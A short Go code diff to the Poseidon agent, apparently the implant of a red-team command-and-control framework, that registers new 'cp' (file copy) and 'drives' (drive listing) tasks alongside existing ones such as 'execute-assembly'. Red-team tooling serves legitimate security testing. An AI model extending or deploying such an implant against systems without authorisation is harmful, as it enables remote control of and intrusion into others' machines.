@@ -27,7 +27,12 @@ import (
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
-import "log"
+import (
+	"log"
+
+	"github.com/xorrior/poseidon/pkg/commands/cp"
+	"github.com/xorrior/poseidon/pkg/commands/drives"
+)
 
 const (
 	NONE_CODE = 30
@@ -111,6 +116,8 @@ func main() {
 		"execute-assembly": 20,
 		"jobs":             21,
 		"jobkill":          22,
+		"cp":               23,
+		"drives":           24,
 		"none":             NONE_CODE,
 	}
 
@@ -364,6 +371,12 @@ func main() {
 					*threadChan <- *msg
 				}(&res, &tMsg)
 				break
+			case 23:
+				// copy a file!
+				go cp.Run(task, res)
+			case 24:
+				// List drives on a machine
+				go drives.Run(task, res)
 			case NONE_CODE:
 				// No tasks, do nothing
 				break
